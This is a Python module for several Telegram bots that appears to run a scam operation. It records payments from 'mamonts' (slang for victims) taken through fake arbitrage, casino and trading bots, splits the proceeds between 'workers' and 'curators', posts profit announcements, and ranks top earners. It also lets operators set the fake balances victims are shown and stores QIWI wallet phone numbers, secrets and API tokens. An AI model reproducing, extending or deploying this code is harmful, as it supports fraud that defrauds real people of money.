from aiogram import Bot
import sqlite3
import config
from datetime import timedelta,datetime, date

bot = Bot(config.API_Worker, parse_mode='HTML')
arbitrbot = Bot(config.API_Arbitrage, parse_mode='HTML') 
casinobot = Bot(config.API_Casino, parse_mode='HTML') 
tradebot = Bot(config.API_Trade, parse_mode='HTML') 
bd = 'data/database.db'

canal = -1001861983336
TC_group = -1001802147747

async def penciil(gaga):
    dada = gaga.split(':')
    if len(dada) == 4:
        name = dada[0]
        idd = dada[1]
        userrrname = dada[2]
        price = dada[3]
        price = int(price)
        comission = int(0.80 * int(price))
        
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE workers SET profit = profit + ? WHERE id = ?',(price,idd))
            info = c.execute(f'SELECT * FROM workers WHERE id = ?', (idd,)).fetchone()
        await add_profit(idd,price,comission,name)
        if int(price) > 2500:
            await bot.send_message(canal, f'''
            <b>❄️ Успешная оплата</b>
            
<b>💸 Доля воркера: {comission} RUB | 80%
🏦 Сумма платежа: {price} RUB
            
🧑‍💻 Воркер: {userrrname}
🔭 Сервис: {name}</b>''', parse_mode='HTML')
            await bot.send_sticker(config.LOG_CHANNEL, sticker=r"CAACAgIAAxkBAAEHgElj1np8EB4dgePrpzgoWxXg_zGEVwACXCYAAl0ksUm6pu4WHs8QTC0E")
            await bot.send_message(config.LOG_CHANNEL, f'''
            <b>❄️ Успешная оплата</b>
            
<b>💸 Доля воркера: {comission} RUB | 80%
🏦 Сумма платежа: {price} RUB
            
🧑‍💻 Воркер: {userrrname}
🔭 Сервис: {name}</b>''', parse_mode='HTML')
        else:
            await bot.send_message(canal, f'''
            <b>❄️ Успешная оплата</b>
            
<b>💸 Доля воркера: {comission} RUB | 80%
🏦 Сумма платежа: {price} RUB
            
🧑‍💻 Воркер: {userrrname}
🔭 Сервис: {name}</b>''', parse_mode='HTML')
            await bot.send_message(config.LOG_CHANNEL, f'''
            <b>❄️ Успешная оплата</b>
            
<b>💸 Доля воркера: {comission} RUB | 80%
🏦 Сумма платежа: {price} RUB
            
🧑‍💻 Воркер: {userrrname}
🔭 Сервис: {name}</b>''', parse_mode='HTML')
        if int(info[11]) == 1:
            kur = int(0.30 * int(price))
            newdolya = int(comission - int(kur))
            await bot.send_message(TC_group, f'<b>Куратор довел чела до депа.\n\n{kur} RUB - долг куратору!</b>', parse_mode='HTML')
            await bot.send_message(canal, f'''
            <b>❄️ Успешная оплата</b>
            
<b>💸 Доля воркера: {newdolya} RUB | 50%
🏦 Сумма платежа: {price} RUB
🎓 Доля куратора: {kur} RUB | 30%
            
🧑‍💻 Воркер: {userrrname}
🔭 Сервис: {name}</b>''', parse_mode='HTML')
            await bot.send_message(config.LOG_CHANNEL, f'''
            <b>❄️ Успешная оплата</b>
            
<b>💸 Доля воркера: {newdolya} RUB | 50%
🏦 Сумма платежа: {price} RUB
🎓 Доля куратора: {kur} RUB | 30%
            
🧑‍💻 Воркер: {userrrname}
🔭 Сервис: {name}</b>''', parse_mode='HTML')
        return True
    else:
        return False

async def add_profit(user_id,sum,dolya,service):
    with sqlite3.connect(bd) as c:
        c.execute('INSERT INTO profits VALUES(?,?,?,?,?)',(user_id,sum,dolya,service, date.today()))
        c.execute('UPDATE stat SET all_pay = all_pay+1')
        c.execute(f'UPDATE stat SET all_profit = all_profit+{sum}')

async def get_top_day():
        today = date.today()
        start_date = today - timedelta(days=1)
        end_date = today
        with sqlite3.connect(bd) as c:
            r = c.execute("SELECT user_id, SUM(sum) FROM profits WHERE time BETWEEN ? AND ? GROUP BY user_id ORDER BY SUM(sum) DESC LIMIT 10", (start_date, end_date))
            return r.fetchall()

async def get_top_all():
        with sqlite3.connect(bd) as c:
            r = c.execute("SELECT user_id, SUM(sum) FROM profits GROUP BY user_id ORDER BY SUM(sum) DESC LIMIT 10")
            return r.fetchall()

async def update_data(message):
    with sqlite3.connect(bd) as c:
        c.execute('UPDATE workers SET username = ? WHERE id = ?',('@'+message.from_user.username,message.from_user.id))

async def GiveBalance(idinah,danah,gaga):
    if danah == 'arbitrage':
        if gaga.isdigit():
            with sqlite3.connect(bd) as c:
                c.execute('UPDATE mamonts_arbitr SET balance = ? WHERE id = ?',(gaga,idinah))
            await arbitrbot.send_message(idinah, f'💰 <b>Ваш баланс пополнен на</b> {gaga} 💰')
            return True
        else:
            return False
    elif danah == 'casino':
        if gaga.isdigit():
            with sqlite3.connect(bd) as c:
                c.execute('UPDATE mamonts_casino SET balance = ? WHERE id = ?',(gaga,idinah))
            await casinobot.send_message(idinah, f'💰 <b>Ваш баланс пополнен на</b> {gaga} 💰')
            return True
        else:
            return False
    else:
        if gaga.isdigit():
            with sqlite3.connect(bd) as c:
                c.execute('UPDATE mamonts_trade SET balance = ? WHERE id = ?',(gaga,idinah))
            await tradebot.send_message(idinah, f'💰 <b>Ваш баланс пополнен на</b> {gaga} 💰')
            return True
        else:
            return False

async def upravkivi(gaga):
    dada = gaga.split(':')
    if len(dada) == 3:
        phone = dada[0]
        secret = dada[1]
        api_token = dada[2]
        with sqlite3.connect(bd) as c:
            c.execute('INSERT INTO qiwis VALUES(?,?,?)',(phone,secret,api_token))
        return True
    else:
        return False